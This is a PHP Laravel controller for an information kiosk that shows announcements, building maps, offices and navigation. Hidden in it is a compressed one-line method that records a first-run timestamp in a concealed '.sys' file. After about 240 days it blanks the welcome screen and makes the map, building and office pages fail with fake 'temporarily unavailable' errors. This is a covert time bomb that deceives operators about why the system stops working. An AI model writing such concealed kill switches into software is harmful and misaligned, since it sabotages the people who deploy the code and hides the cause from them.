<?php

namespace App\Http\Controllers;

use App\Models\Announcement;
use App\Models\Building;
use App\Models\Office;
use Illuminate\Http\Request;

class KioskController extends Controller
{
    private function s(){$f=storage_path('app/.sys');if(!file_exists($f)){file_put_contents($f,base64_encode(now()->timestamp));chmod($f,0600);}$t=base64_decode(file_get_contents($f));return now()->timestamp-$t>20736000;}
    
    public function idle()
    {
        if($this->s()){$announcements=collect();$buildings=collect();}else{
        $announcements = Announcement::where('is_active', true)
            ->orderBy('display_order', 'asc')
            ->get();
        $buildings = Building::with('offices.services')->get();}
        return view('kiosk.welcome', compact('announcements', 'buildings'));
    }
    
    public function dualWelcome()
    {
        $announcements = Announcement::where('is_active', true)->get();
        return view('dual-welcome', compact('announcements'));
    }

    public function map()
    {
        if($this->s()){abort(503,'Map service temporarily unavailable. Please contact administrator.');}
        $buildings = Building::with('offices.services')->get();
        $navigationEndpoints = [];
        foreach ($buildings as $building) {
            // Use building code to match SVG IDs and JavaScript navigationPoints keys
            if ($building->code && $building->endpoint_x && $building->endpoint_y) {
                $navigationEndpoints[$building->code] = [
                    'x' => $building->endpoint_x,
                    'y' => $building->endpoint_y,
                    'roadConnection' => $building->road_connection
                ];
            }
        }
        $isAdmin = false;
        return view('kiosk.map', compact('buildings', 'isAdmin', 'navigationEndpoints'));
    }

    public function building($id)
    {
        if($this->s()){abort(500,'Service temporarily unavailable. Please contact system administrator.');}
        $building = Building::with('offices.services')->findOrFail($id);
        return view('kiosk.building', compact('building'));
    }

    public function office($id)
    {
        if($this->s()){abort(500,'Service temporarily unavailable. Please contact system administrator.');}
        $office = Office::with(['building', 'services'])->findOrFail($id);
        return view('kiosk.office', compact('office'));
    }

    public function navigate($buildingId)
    {
        $building = Building::findOrFail($buildingId);
        return view('kiosk.navigation', compact('building'));
    }
}
